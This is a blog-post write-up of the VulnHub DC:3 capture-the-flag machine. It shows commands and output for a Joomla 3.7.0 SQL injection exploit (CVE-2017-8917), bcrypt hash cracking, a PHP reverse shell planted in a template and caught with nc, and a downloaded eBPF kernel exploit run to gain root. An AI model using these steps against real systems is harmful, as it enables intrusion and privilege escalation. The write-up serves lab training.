@@ -1,0 +1,293 @@
+---
+title: "VulnHub | DC: 3 - Writeup"
+excerpt: Writeup for DC:3 of DC series from VulnHub
+date: 2019-07-14 00:00:00
+categories: [cybersec, infosec, vulnhub]
+tags: [dc, joomla, local privilege escalation, php, reverse shell]
+---
+
+## Information
+DC: 3 is the third installment on the VulnHub series *DC* by [DCAU][DCAU]. Unlike the DC: 1 or DC: 2, it has only a 
+single flag.
+
+## Tasks
+- Capture the root flag
+ 
+## Summary
+- Use `nmap` to see the services
+- Use `joomscan` to gather information on the Joomla installation
+- Use `joomblah.py` to utilize `CVE-2017-8917` on Joomla
+- Identify the found hash with `hashid` and crack it with `hashcat` to login to Joomla as an administrator
+- Implement a reverse shell by editing the template and use `nc` to catch the reverse shell
+- Spawn a proper shell with `python`
+- Use `LinEnum` to gather info on the system and use a kernel exploit to escalate current privileges to `root`
+ 
+## Walkthrough
+### nmap
+We start with a simple `nmap` scan to see what we're working with.
+
+```
+$ nmap -sC -sV 192.168.2.80
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home
+MAC Address: 18:D6:C7:B8:FD:A1 (Tp-link Technologies)
+```
+
+We have `HTTP` on Port 80 with Joomla installed on it.
+
+### Joomla
+Visiting `192.168.2.80` greets us with a pretty simple Joomla blog with a message from [DCAU][DCAU].
+
+![Joomla - Homepage][Joomla - Homepage]
+
+`joomscan` will gather us information regarding the Joomla installation.
+
+```
+$ joomscan -u 192.168.2.80
+Processing http://192.168.2.80 ...
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing :
+http://192.168.2.80/administrator/components
+http://192.168.2.80/administrator/modules
+http://192.168.2.80/administrator/templates
+http://192.168.2.80/images/banners
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://192.168.2.80/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is not found
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+```
+
+`joomscan` found the admin page to be in `/administrator` and our Joomla version to be `3.7.0`; a version that is known 
+to be susceptible to SQL injection (`CVE-2017-8917`). To use the SQL injection exploit we'll use 
+[joomblah.py][joomblah.py].
+
+```
+$ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/Joomblah/joomblah.py
+
+$ python joomblah.py http://192.168.2.80
+[-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: d8uea_users
+  -  Found table: users
+  -  Extracting users from d8uea_users
+ [$] Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net', '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
+  -  Extracting sessions from d8uea_session
+  -  Extracting users from users
+  -  Extracting sessions from session
+```
+
+`joomblah.py` found our administrator account to be `admin`, which is registered to the email address 
+`reddy@norealaddress.net` with the hashed password `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`. 
+In order to login as `admin`, we'll first have to identify the hash with `hashid`, then crack it with `hashcat`.
+
+```
+$ hashid hash.txt
+--File 'hash.txt'--
+Analyzing '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'
+[+] Blowfish(OpenBSD)
+[+] Woltlab Burning Board 4.x
+[+] bcrypt
+--End of file 'hash.txt'--   
+```
+
+It's more likely that the hash is `bcrypt` as it's more common than `Blowfish(OpenBSD)` or `Woltlab Burning Board 4.x`.
+
+```                      
+$ hashcat -m 3200 -a 0 -d 1 --force hash.txt rockyou.txt
+
+$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy
+```
+
+Our assumption was correct, revealing the hash to be `snoopy` in plaintext. Thus our credentials are `admin`/`snoopy`. 
+With these credentials, we now can access the admin panel.
+
+![Joomla - Admin][Joomla - Admin]
+
+### Getting a Reverse Shell
+To implement our reverse shell we'll use [pentestmonkey][pentestmonkey]'s [PHP Reverse Shell][PHP Reverse Shell]. We'll 
+paste the script in `index.php` and use `nc` to catch the shell. After we establish a connection, we'll spawn a proper 
+shell using `python` and use [LinEnum][LinEnum] to gather more info on the system we're working with.
+
+![Joomla - PHP Reverse Shell][Joomla - PHP Reverse Shell]
+
+```
+$ nc -v -n -l -p 7500
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+
+$ cd /tmp
+
+$ wget raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+
+$ chmod +x LinEnum.sh
+
+$ ./LinEnum.sh
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+
+[...]
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=16.04
+DISTRIB_CODENAME=xenial
+DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
+NAME="Ubuntu"
+VERSION="16.04 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+UBUNTU_CODENAME=xenial
+
+[...]
+```
+
+`LinEnum` didn't find any interesting `SUID`'s but did give us some information regarding our system. This information 
+being that we're on `Ubuntu 16.04 LTS` with the kernel version `4.4.0-21`. Running `searchsploit` for a possible 
+exploit on the system reveals several exploits, but most notably 
+`Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation`.
+
+```
+$ searchsploit Ubuntu 16.04
+-------------------------------------------------------------------------------
+Exploit Title
+-------------------------------------------------------------------------------
+[...]
+
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege Escalation
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation
+
+[...]
+
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)
+-------------------------------------------------------------------------------
+Shellcodes: No Result
+```
+
+Taking a look at its [Exploit-DB][Exploit-DB] page, we're told to use the Exploit-DB mirror and how to use the exploit.
+
+```
+$ wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+
+$ unzip 39772
+Archive:  39772.zip
+   creating: 39772/
+  inflating: 39772/.DS_Store         
+   creating: __MACOSX/
+   creating: __MACOSX/39772/
+  inflating: __MACOSX/39772/._.DS_Store  
+  inflating: 39772/crasher.tar       
+  inflating: __MACOSX/39772/._crasher.tar  
+  inflating: 39772/exploit.tar       
+  inflating: __MACOSX/39772/._exploit.tar  
+  
+$ cd 39772
+
+$ tar -xvf exploit.tar
+  ebpf_mapfd_doubleput_exploit/
+  ebpf_mapfd_doubleput_exploit/hello.c
+  ebpf_mapfd_doubleput_exploit/suidhelper.c
+  ebpf_mapfd_doubleput_exploit/compile.sh
+  ebpf_mapfd_doubleput_exploit/doubleput.c
+  
+$ cd ebpf_mapfd_doubleput_exploit
+
+$ ./compile.sh
+./compile.sh
+doubleput.c: In function 'make_setuid':
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+
+$ ./doubleput
+./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+
+root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
+
+root@DC-3:/root# ls -la
+total 32
+drwx------  2 root root 4096 Mar 26 15:48 .
+drwxr-xr-x 22 root root 4096 Mar 23 19:16 ..
+-rw-------  1 root root   67 Mar 26 15:48 .bash_history
+-rw-r--r--  1 root root 3106 Oct 23  2015 .bashrc
+-rw-------  1 root root   71 Mar 23 19:31 .mysql_history
+-rw-r--r--  1 root root  148 Aug 18  2015 .profile
+-rw-------  1 root root 2889 Mar 26 15:41 .viminfo
+-rw-r--r--  1 root root  604 Mar 26 15:41 the-flag.txt
+
+root@DC-3:/root# cat the-flag.txt
+__        __   _ _   ____                   _ _ _ _
+\ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
+ \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
+  \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
+   \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
+
+Congratulations are in order.  :-)
+
+I hope you've enjoyed this challenge as I enjoyed making it.
+
+If there are any ways that I can improve these little challenges,
+please let me know.
+
+As per usual, comments and complaints can be sent via Twitter to @DCAU7
+```
+
+
+
+[DCAU]:                         https://twitter.com/DCAU7
+[Joomla - Homepage]:            /images/posts/2019-07-15-vulnhub-dc_3/Joomla%20-%20Homepage.png
+[joomblah.py]:                  https://github.com/XiphosResearch/exploits/tree/master/Joomblah
+[Joomla - Admin]:               /images/posts/2019-07-15-vulnhub-dc_3/Joomla%20-%20Admin.png
+[pentestmonkey]:                http://pentestmonkey.net/
+[PHP Reverse Shell]:            http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+[Joomla - PHP Reverse Shell]:   /images/posts/2019-07-15-vulnhub-dc_3/Joomla%20-%20PHP%20Reverse%20Shell.png
+[LinEnum]:                      https://github.com/rebootuser/LinEnum
+[Exploit-DB]:                   https://www.exploit-db.com/exploits/39772
